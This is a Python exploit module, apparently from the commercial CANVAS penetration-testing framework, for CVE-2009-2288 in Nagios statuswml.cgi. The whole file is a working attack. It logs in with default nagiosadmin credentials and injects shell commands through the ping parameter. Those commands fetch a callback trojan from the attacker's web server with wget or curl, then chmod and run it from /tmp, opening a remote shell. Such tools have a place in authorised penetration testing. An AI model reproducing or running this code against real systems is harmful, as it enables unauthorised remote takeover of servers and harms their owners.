#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit
from exploitmanager import exploitmanager
import libs.spkproxy as spkproxy #for urlopen
import re
import time

NAME="nagios_ping"
DESCRIPTION="Nagios < 3.1.1 statuswml.cgi Command Injection Vulnerability"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="http://www.nagios.org/"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"] = "CVE-2009-2288"
DOCUMENTATION['CVEUrl']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2288'
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["Notes"] = """statuswml.cgi in Nagios before 3.1.1 allows remote attackers to execute arbitrary commands via shell metacharacters in the (1) ping or (2) Traceroute parameters.  The actual .cgi file scrubs a lot of characters that would make this attack slightly easier, so wget or curl are used to download a trojan onto the target machine.  If either of those two commands are not avaliable on the target machine then this exploit will fail."""

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""
execute commands like this: "http://target.com/nagios/cgi-bin/statuswml.cgi?ping=127.0.0.1;some command"
keep in mind that the cgi script will filter characters like ">" which makes a few techniques difficult.
Tested on Nagios version 2.12 and 3.0
"""

CHANGELOG="""
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port               = 80
        self.host               = ""
        self.badstring          = "\x00"
        self.setVersions()
        self.version            = 0
        self.done               = 0
        self.name               = NAME    
        self.basepath           = "/"
        self.username           = ""
        self.password           = ""
        self.basicauth_user     = "nagiosadmin"
        self.basicauth_password = "nagiosadmin"
        self.hostname           = ""
        self.ping               = "/cgi-bin/statuswml.cgi?ping=127.0.0.1"
        self.webserverport      = 8080
        self.filename           = "trojan.bin"
        self.htmlfilename       = "index.html"

        return

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host               = self.target.interface
        self.hostname           = self.argsDict.get("hostname", self.hostname)
        self.port               = int(self.argsDict.get("port",self.port))
        self.basepath           = self.argsDict.get("basepath", self.basepath)
        self.ssl                = self.argsDict.get("ssl",self.ssl)
        self.basicauth_user     = self.argsDict.get("username", self.username)
        self.basicauth_password = self.argsDict.get("password", self.password)
        self.webserverport      = int(self.argsDict.get("webserverport", self.webserverport))
        self.trojanname         = self.get_random_filename()

        """
        if self.hostname in [None, ""]:
            allhosts=self.target.get_knowledge("www_hostnames")
            if allhosts==None:
                allhosts=["%s"%self.host]
        else:
            allhosts=[self.hostname]
        self.allhosts=allhosts
        """
        self.allhosts=[self.hostname]
        return 
    
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        self.versions[1]=[""]

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.LINUXMOSDEF]
        
    def test(self):
        """
        Quicky banner check - looks for comon basepaths
        """    
        #you can't really test for Nagios because as soon as you enter the folder you are prompted for BASIC AUTH - so you don't see anything until you authenticate :/
        
        """
        self.getargs()
        self.log("Using basepath=%s"%self.basepath)
        self.log("Using vhost=%s"%self.hostname)
        if self.ssl:
            protocol="https"
        else:
            protocol="http"

        for hostname in self.allhosts:
            self.log("Testing hostname: %s"%hostname)

            #automatically check out some common basepaths, starting with the one specified
            for basepath in [self.basepath, "/nagios","/"]:
                self.log("Testing for basepath: %s"%basepath)

                #If we have to do basic-auth, let's get an object from spkproxy here
                if self.basicauth_user !="":
                    auth=spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
                else:
                    auth=None 
                    
                fd=spkproxy.urlopen(protocol+"://"+self.host+":%s"%self.port+"/"+basepath, hostname=hostname, exploit=self, auth=auth)
                data=fd.read()

                #now that we have the web page - we parse it and look for vulnerable versions
                #list of vulnerable versions so far
                for s in ["nagios", "Nagios"]:
                    #self.log("Data=%s"%data) #print out web page (big)
                    if s in data:
                        self.log("Found Nagios in vhost %s at basepath %s"%(hostname, basepath))
                        self.argsDict["basepath"]=basepath
                        self.basepath=basepath
                        self.hostname=hostname
                        self.version=1
                        return 1
        return 0
"""
        return 0
    
    def get_random_filename(self):
        import string
        import random
        chars = list(string.lowercase+string.uppercase+string.digits)
        return "tr"+"".join(random.sample(chars, 4))
    
    

    def set_up_webserver(self):
        
        data=self.makedownloadfile()
        app=self.engine.getModuleExploit("httpserver")
        app.link(self)
        app.argsDict["port"]=self.webserverport
        app.argsDict["singleexploit"]="upload"
        app.argsDict["sourcedata"]=data
        app.HTTPMOSDEF = False
        app.singleshot = True
        #app.listenerArgsDict["fromcreatethread"]=1
        app.response_threshold = 1
        app.callback = None
        
        self.manager=exploitmanager(app, self.engine)
        self.manager.setDaemon(True)
        self.manager.run()
        return
    
    def makedownloadfile(self):
        print "[*] making trojan [*]"
        trojanmod = self.engine.getModuleExploit("BuildCallbackTrojan")
        trojanmod.link(self)
        trojanmod.argsDict["filename"]="nagiostrojan"
        trojanmod.argsDict["callback_host"]=self.callback.ip
        trojanmod.argsDict["callback_port"]=self.callback.port
        trojanmod.argsDict["OS"]="Linux"
        trojanmod.argsDict["ARCH"]="X86"
        trojanmod.run()
        
        data=file("nagiostrojan","rb").read()
        return data
        
        
    def run(self):
        self.getargs()
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.hostname,self.port))
        
        self.log("Attacking %s:%d"%(self.hostname,self.port))
        self.log("Basic Auth User: %s"%self.basicauth_user)
        self.log("VHost: %s"%self.hostname)
        if self.ssl:
            protocol="https"
        else:
            protocol="http"

        #If we have to do basic-auth, let's get an object from spkproxy here
        if self.basicauth_user !="":
            auth=spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
        else:
            auth=None
        
        useragentstring=protocol+"://"+self.host+":%s"%self.port+"/"+self.basepath    
        self.log("useragentstring: %s"%useragentstring)

        UA=spkproxy.UserAgent(useragentstring, auth=auth, hostname=self.hostname, exploit=self)
        
        t = threading.Thread(target=self.set_up_webserver)
        t.setDaemon(True)
        t.start()

        response = UA.GET("""/cgi-bin/statuswml.cgi?ping=127.0.0.1;wget%%20-O%%20/tmp/%s%%20http://%s:%s/index.html"""%(self.trojanname, self.callback.ip, self.webserverport), noresponse=False)
        response = UA.GET("""/cgi-bin/statuswml.cgi?ping=127.0.0.1;chmod%%20777%%20/tmp/%s;/tmp/%s"""%(self.trojanname, self.trojanname), noresponse=True)
        
        time.sleep(5)

        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return 1
        else:
            print "wget attempt failed - retrying with curl"
            response = UA.GET("""/cgi-bin/statuswml.cgi?ping=127.0.0.1;curl%%20-o%%20/tmp/%s%%20http://%s:%s/index.html"""%(self.trojanname, self.callback.ip, self.webserverport), noresponse=False)
            response = UA.GET("""/cgi-bin/statuswml.cgi?ping=127.0.0.1;chmod%%20777%%20/tmp/%s;/tmp/%s"""%(self.trojanname, self.trojanname), noresponse=True)
            time.sleep(5)
            if self.ISucceeded():
                self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
                return 1
            else:
                self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
                return 0
    
    def shutdown(self):
        self.done=1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
